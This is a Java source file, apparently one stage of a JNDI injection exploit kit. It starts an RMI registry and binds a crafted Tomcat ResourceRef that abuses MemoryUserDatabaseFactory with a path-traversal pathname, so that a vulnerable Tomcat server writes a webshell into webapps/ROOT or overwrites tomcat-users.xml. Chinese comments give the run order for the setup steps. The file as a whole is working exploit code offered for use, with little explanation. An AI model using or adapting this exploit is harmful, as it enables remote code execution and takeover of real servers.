package org.exploit.jndiHighVersion.Tomcat.h2database;

import org.apache.naming.ResourceRef;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.util.Hashtable;

//除了写tomcat-users.xml外，还可以在webapps/ROOT目录下创建一个webshell，
public class MemoryUserRCE_setup2_webshell {
    public static void main(String[] args) throws Exception {
        LocateRegistry.createRegistry(1099);
        Hashtable<String, String> env = new Hashtable<>();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL, "rmi://localhost:1099");
        ResourceRef ref2 = new ResourceRef("org.apache.catalina.UserDatabase", null, "", "", true, "org.apache.catalina.users.MemoryUserDatabaseFactory", null);
        ref2.add(new StringRefAddr("pathname", "http://127.0.0.1:8888/../../webapps/ROOT/test.jsp"));
        ref2.add(new StringRefAddr("readonly", "false"));
        InitialContext context = new InitialContext(env);
        context.bind("remoteImpl", ref2);
        //先运行setup1创建两个目录，然后运行该setup2，需要在本地开http且存在../../conf/tomcat-users.xml文件，写tomcat管理文件
    }
}
